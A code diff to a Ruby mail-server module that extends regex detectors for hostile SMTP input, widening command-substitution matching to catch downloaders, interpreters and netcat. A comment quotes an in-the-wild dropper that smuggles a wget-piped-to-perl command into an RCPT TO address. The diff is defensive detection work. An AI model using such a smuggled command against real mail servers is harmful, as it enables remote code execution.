@@ -24,8 +24,22 @@ module MailOnRails
         "exim_expansion" => /\$\{(?:sh|perl|readsocket|extract|lookup|dlfunc)\b/i,
         # Shellshock (CVE-2014-6271): a function-definition preamble.
         "shellshock" => /\(\s*\)\s*\{/,
-        # Backtick / $() command substitution reaching for a system path.
-        "command_substitution" => %r{(?:`|\$\()[^`)]*/(?:bin|etc|tmp|dev)/}i,
+        # Backtick / $() command substitution: either reaching for a system
+        # path, or opening straight onto a downloader/interpreter (the
+        # dropper shape seen in the wild - `RCPT TO:<"... $(nohup wget -qO -
+        # http://x/y | perl &) ..."@cve.invalid>` - carries no path at all).
+        # The interpreter form requires the program name right after the
+        # opener (optional nohup/env/sudo/exec prefixes) so a backtick that
+        # is merely an atext character in a real local-part can't trip it.
+        "command_substitution" => %r{
+          (?:`|\$\()
+          (?:
+            [^`)]*/(?:bin|etc|tmp|dev)/
+            |
+            \s*(?:(?:nohup|env|sudo|exec)\s+)*
+            (?:wget|curl|fetch|tftp|perl|python[23]?|ruby|php|bash|sh|zsh|nc|ncat|netcat|busybox)\b
+          )
+        }xi,
         # SMTP address-enumeration reconnaissance against privileged locals.
         "vrfy_privileged" => /\AVRFY\s+(?:root|admin|administrator|postmaster|bin|daemon|mail)\b/i,
         "expn_probe" => /\AEXPN\b/i
